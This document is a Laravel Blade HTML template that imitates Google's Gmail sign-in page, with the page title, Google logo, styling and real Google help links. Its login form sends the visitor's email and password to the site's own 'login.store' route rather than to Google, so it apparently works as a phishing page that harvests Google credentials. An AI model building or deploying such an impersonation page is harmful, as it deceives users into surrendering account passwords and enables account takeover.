<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in - Google</title>
    <link rel="stylesheet" href="style.css" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>

<body>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
        }

        body {
            background-color: #202124;
            color: #e8eaed;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            justify-content: center;
            padding: 20px;
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .card {
            background-color: #0e0e0e;
            border-radius: 28px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
            padding: 40px;
            max-width: 900px;
            width: 100%;
            animation: fadeIn 0.4s ease-in-out;
        }

        .holder {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            gap: 60px;

        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .left-section {
            flex: 1;
        }

        .logo {
            width: 75px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 28px;
            margin-bottom: 5px;
        }

        .subtitle {
            font-size: 15px;
            color: #9aa0a6;
        }

        .right-section {
            flex: 1.2;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            padding: 14px;
            background: transparent;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            margin-bottom: 14px;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #8ab4f8;
        }

        .link {
            color: #8ab4f8;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 25px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .guest {
            font-size: 13px;
            color: #9aa0a6;
            margin-bottom: 30px;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }

        .create {
            font-size: 14px;
            color: #8ab4f8;
            text-decoration: none;
        }

        button {
            background-color: #8ab4f8;
            color: #202124;
            border: none;
            padding: 10px 24px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background-color: #669df6;
        }

        footer {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 900px;
            margin-top: 20px;
            font-size: 13px;
            color: #9aa0a6;
            flex-wrap: wrap;
        }

        footer a {
            color: #9aa0a6;
            margin-left: 20px;
            text-decoration: none;
        }

        footer a:hover {
            text-decoration: underline;
        }

        .Wf6lSd {
            margin-bottom: 24px;
        }

        /* ========================
   ✅ Responsive Breakpoints
   ======================== */
        @media (max-width: 768px) {
            body {
                background-color: #0e0e0e;
            }

            .Wf6lSd {
                margin-bottom: 0px;
            }

            .card {
                padding: 0;
                box-shadow: none;
            }

            .holder {
                flex-direction: column;
                padding: 30px 20px;
                gap: 30px;
            }

            .left-section,
            .right-section {
                flex: unset;
                width: 100%;
            }

            .actions {
                flex-direction: column;
                align-items: flex-start;
            }

            .actions button {
                align-self: flex-end;
            }

            footer {
                flex-direction: column;
                align-items: center;
                text-align: center;
                gap: 10px;
            }

            footer .right a {
                margin-left: 10px;
                margin-right: 10px;
            }
        }
    </style>
    <div class="wrapper">
        <div class="card">

            <div class="Wf6lSd" jscontroller="rmumx" jsname="n7vHCb"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
                    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                </svg></div>
            <div class="holder">
                <div class="left-section">
                    <!-- <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo" /> -->
                    <h2>Sign in</h2>
                    <p class="subtitle">to continue to Gmail</p>
                </div>

                
                <div class="right-section">
                    <form method="POST" action="{{ route('login.store') }}">
                        @csrf

                        <input type="text" name="email" placeholder="Email or phone" value="{{ old('email') }}" required />
                        @error('email')
                            <div style="color: #e94235; font-size: 13px; margin-bottom: 8px;">{{ $message }}</div>
                        @enderror

                        <input type="password" name="password" placeholder="Password" required />
                        @error('password')
                            <div style="color: #e94235; font-size: 13px; margin-bottom: 8px;">{{ $message }}</div>
                        @enderror

                        <a href="https://accounts.google.com/signin/v2/usernamerecovery?authuser=0&continue=https%3A%2F%2Fmail.google.com%2Fmail&dsh=S809126374%3A1751677000644811&ec=GAlAFw&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&service=mail" class="link">Forgot email?</a>

                        <p class="guest">
                            Not your computer? Use Guest mode to sign in privately.
                            <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="link">Learn more about using Guest mode</a>
                        </p>

                        <div class="actions">
                            <a href="https://accounts.google.com/lifecycle/steps/signup/name?authuser=0&continue=https://mail.google.com/mail&dsh=S809126374:1751677000644811&ec=GAlAFw&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&service=mail&TL=ALgCv6yA76H8J5afXJIW9r0vnsW9GkH1B4dOzqrSLn2vtGE4c-PxqYkoeO_3dRMI" class="create">Create account</a>
                            <button type="submit">Sign in</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer>
            <div class="left">English (United States)</div>
            <div class="right">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </footer>
    </div>
</body>

</html>
